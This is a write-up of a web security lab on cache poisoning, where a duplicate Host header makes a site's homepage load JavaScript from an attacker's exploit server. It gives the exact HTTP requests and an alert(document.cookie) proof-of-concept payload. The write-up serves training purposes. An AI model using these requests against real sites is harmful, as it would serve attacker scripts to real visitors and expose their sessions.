# Web Cache Poisoning via Ambiguous Requests

## Vulnerability Definition


**Web Cache Poisoning** is a vulnerability that occurs when an attacker can influence a response that is stored in a web cache, causing 
other users to receive the poisoned response.



In this lab, the poisoning is possible because the **cache and the backend interpret an ambiguous request differently**, specifically a 
request containing multiple `Host` headers.



---


## Lab Goal



Poison the cache of the homepage so that it loads a malicious JavaScript file from the Exploit Server containing:



```javascript

alert(document.cookie)

```



When the victim visits the poisoned homepage, the JavaScript executes in their browser.



---



## Core Concept




The application validates the first `Host` header to make sure the request is sent to the correct lab.




However, the backend also processes the **second `Host` header** and reflects its value into the JavaScript URL:




```html


<script src="//SECOND-HOST/resources/js/tracking.js"></script>

```



This allows us to make the homepage reference a JavaScript file hosted on our Exploit Server.



The poisoned response is then stored in the cache and served to subsequent visitors.



---



# Exploitation Steps



## 1. Send the Homepage to Repeater



From:



**Proxy → HTTP history**



Find:



```http

GET / HTTP/1.1

```



Send it to Repeater.



---



## 2. Add a Cache Buster



Use an arbitrary query parameter:



```http

GET /?cb=12345 HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

```



### Why?



The cache buster forces a fresh request to the backend instead of reusing an existing cached response.



---



## 3. Add a Second Host Header



Modify the request:



```http

GET /?cb=12345 HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Host: YOUR-EXPLOIT-SERVER.exploit-server.net


```




The first `Host` is used for the normal lab validation/routing.



The second `Host` is processed differently by the backend and gets reflected into the page.



---



## 4. Identify the Reflection



A successful response contains something similar to:



```html

<script type="text/javascript"


src="//YOUR-EXPLOIT-SERVER.exploit-server.net/resources/js/tracking.js">

</script>

```




This confirms that the second `Host` value is being reflected into the JavaScript URL.



---




## 5. Confirm Cache Poisoning



Look for caching headers such as:



```http

Cache-Control: max-age=30

Age: 3

X-Cache: hit

```


### `X-Cache: hit`


Indicates that the response was served from the cache.



### `Age`



Shows approximately how long the response has been stored in the cache.



If the cached response contains our Exploit Server URL, the cache has been poisoned.



---




# 6. Create the Malicious JavaScript



On the **Exploit Server**, create:



```text

/resources/js/tracking.js

```




With the following body:

```javascript

alert(document.cookie)

```




Then click **Store**.



---



# 7. Verify the Exploit Server



Make sure the JavaScript file is actually accessible:





```http

GET /resources/js/tracking.js HTTP/1.1

Host: YOUR-EXPLOIT-SERVER.exploit-server.net


```




The response should contain:




```javascript

alert(document.cookie)

```


---




# 8. Poison the Cache



Send the ambiguous request again:





```http

GET /?cb=12345 HTTP/1.1


Host: YOUR-LAB-ID.web-security-academy.net

Host: YOUR-EXPLOIT-SERVER.exploit-server.net

```




The cached homepage should now contain:





```html


<script src="//YOUR-EXPLOIT-SERVER.exploit-server.net/resources/js/tracking.js"></script>


```



---



# 9. Simulate the Victim



Open the poisoned homepage in the Burp Browser:


```text

https://YOUR-LAB-ID.web-security-academy.net/?cb=12345


```




The browser loads:



```text


/resources/js/tracking.js

```



from the Exploit Server.



The JavaScript executes:




```javascript

alert(document.cookie)

```




The alert confirms that the poisoned JavaScript is being executed.



---



# 10. Poison the Actual Homepage


After confirming that the attack works, remove the cache buster:





```http

GET / HTTP/1.1


Host: YOUR-LAB-ID.web-security-academy.net

Host: YOUR-EXPLOIT-SERVER.exploit-server.net

```


Continue sending the request until the homepage is cached with the malicious JavaScript URL.


The victim can now receive the poisoned homepage without needing the cache-buster parameter.




---



# Exploitation Flow



```text

Ambiguous HTTP Request

        ↓

Multiple Host Headers

        ↓

Different parsing by cache and backend



        ↓

Second Host is reflected

        ↓

JavaScript URL points to Exploit Server

        ↓


Malicious response is cached

        ↓
Victim requests the homepage

        ↓

Browser loads tracking.js

        ↓


alert(document.cookie)

        ↓


LAB SOLVED


```



---



## Key Takeaways



- Multiple `Host` headers can create **request ambiguity**.

- The cache and backend may interpret the same request differently.

- A reflected `Host` value can become dangerous when it is used to construct an absolute URL.

- A cache buster is useful while testing because it helps obtain a fresh backend response.

- `X-Cache: hit` is an important indicator when investigating cache behavior.

- The final goal is to poison the **actual cached homepage**, not just a cache-busted URL.


### Important Distinction



This is not simply a **Host Header Injection** vulnerability.





The critical issue is the combination of:



```text

Ambiguous Request

+

Different Cache/Backend Interpretation

+

Host Header Reflection


+

Web Caching

```



Together, these allow the attacker to poison the cached response.
